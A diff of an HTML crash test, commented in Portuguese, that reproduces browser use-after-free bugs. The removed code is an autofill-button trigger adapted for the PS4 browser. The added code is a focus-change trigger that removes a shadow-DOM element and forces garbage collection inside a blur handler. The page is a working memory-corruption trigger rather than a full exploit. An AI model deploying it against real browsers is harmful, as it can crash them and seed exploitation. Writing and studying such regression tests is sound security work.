@@ -1,83 +1,69 @@
 <!DOCTYPE html>
 <html>
-<head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
-<style>
-    body { font-family: sans-serif; padding: 20px; }
-    input { width: 300px; height: 40px; font-size: 16px; }
-    #console { white-space: pre-wrap; font-family: monospace; margin-top: 20px; }
-</style>
-</head>
 <body>
+<p>This test passes if it does not crash.</p>
+<div id="host"></div>
+<div id="result"></div>
 
-<div id="result">
-    <p>Teste de AutoFillButton UAF (Adaptado para PS4)</p>
-    <input type="password" id="passwordInput" placeholder="Clique no campo ou no botão abaixo">
-</div>
-<br>
-<button id="manualTrigger" style="padding: 10px 20px; font-size: 16px;">Simular Clique no Botão / Preenchimento</button>
-<div id="console"></div>
+<!-- Elementos para simular a disputa de foco do FocusController -->
+<input id="outerInput" type="text" tabindex="1">
+<iframe id="frame1" srcdoc="<input id='innerInput' tabindex='1'>"></iframe>
 
 <script>
-// --- Função GC integrada do arquivo gc.js fornecido ---
-if (!window.gc) {
-    window.gc = function() {
-        if (typeof window.GCController !== "undefined")
-            return GCController.collect();
-
-        // Fallback de pressão de memória caso GCController não esteja exposto
-        function gcRec(n) {
-            if (n < 1) return {};
-            var temp = {i: "ab" + n + (n / 100000)};
-            temp += "foo";
-            gcRec(n-1);
-        }
-        for (let i = 0; i < 1000; i++)
-            gcRec(10);
+// --- Função GC integrada ---
+function gc() {
+    function gcRec(n) {
+        if (n < 1)
+            return {};
+        var temp = { i: "ab" + i + (i / 100000) };
+        temp += "foo";
+        gcRec(n - 1);
     }
+    for (var i = 0; i < 10000; i++)
+        gcRec(10);  
 }
 
-function debug(msg) {
-    document.getElementById('console').innerHTML += msg + '<br>';
-}
+let shadowRoot = host.attachShadow({ mode: 'open' });
+let victim = document.createElement('div');
+victim.tabIndex = 0;
+victim.textContent = 'Focusable';
+shadowRoot.appendChild(victim);
 
-onload = () => {
-    const input = document.querySelector('input');
-    const triggerBtn = document.getElementById('manualTrigger');
+async function runTest() {   
+    // O gatilho do UAF original: remove a vítima e roda GC no blur[cite: 1]
+    victim.addEventListener('blur', () => {
+        victim.remove();
+        victim = null;
+        gc();
+    }, true);
 
-    // Listener principal que reproduz o gatilho da vulnerabilidade: 
-    // altera o tipo do input no meio do evento de clique, destruindo o owner antigo
-    input.addEventListener('click', () => {
-        debug("Evento de clique disparado: alterando input.type para 'button'...");
-        input.type = 'button';
-        
-        // Executa a coleta de lixo integrada
-        if (typeof window.gc === 'function') {
-            window.gc();
-            debug("Coleta de lixo (gc) executada.");
+    // 1. Foca na vítima do Shadow DOM primeiro
+    victim.focus();
+
+    // 2. Substituição lógica do UIHelper: 
+    // Em vez de desligar a janela via API interna, forçamos o FocusController 
+    // a reavaliar o foco global movendo-o para o outerInput e para o iframe 
+    // na mesma árvore de ticks, forçando a transição de documentos.
+    const outerInput = document.getElementById('outerInput');
+    const frame1 = document.getElementById('frame1');
+
+    outerInput.focus();
+    
+    if (frame1 && frame1.contentDocument) {
+        let innerInput = frame1.contentDocument.getElementById('innerInput');
+        if (innerInput) {
+            innerInput.focus();
         }
-    }, { once: true });
+    }
 
-    // Função de ativação simulada para o navegador do console
-    triggerBtn.addEventListener('click', () => {
-        debug("Simulando ativação do elemento...");
-        input.focus();
-        
-        // Dispara um evento de clique sintético para acionar o fluxo do elemento de sombra
-        const clickEvent = new MouseEvent('click', {
-            view: window,
-            bubbles: true,
-            cancelable: true
-        });
-        input.dispatchEvent(clickEvent);
-        
-        document.getElementById('result').innerHTML += '<p><strong>Teste executado. Se o navegador não fechou abruptamente, a proteção de ponteiro está ativa ou o ambiente tratou a falha com segurança.</strong></p>';
+    await new Promise((resolve) => {
+        requestAnimationFrame(() => setTimeout(resolve, 0));
     });
 
-    debug("Pronto. Clique em 'Simular Clique no Botão / Preenchimento' para iniciar.");
-};
-</script>
+    result.textContent = 'PASS';    
+}    
 
+runTest();
+</script>
 </body>
 </html>
